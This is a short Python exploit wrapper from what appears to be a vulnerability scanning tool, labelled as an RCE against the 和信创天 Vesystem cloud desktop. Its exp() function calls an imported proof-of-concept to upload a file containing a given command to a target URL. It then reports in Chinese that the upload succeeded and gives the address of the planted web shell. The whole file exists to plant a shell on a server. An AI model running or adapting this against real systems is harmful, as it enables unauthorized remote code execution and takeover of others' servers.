# -*- coding:utf-8 -*-
# 和信创天云桌面_RCE

from VulnScanModel.models import VulnScan
from . import vesystem_rce_poc


def exp(vuln: VulnScan, cmd, content=""):
    return "文件上传成功，shell地址：\n%s" % vesystem_rce_poc.upload_file(vuln.url, cmd, content)
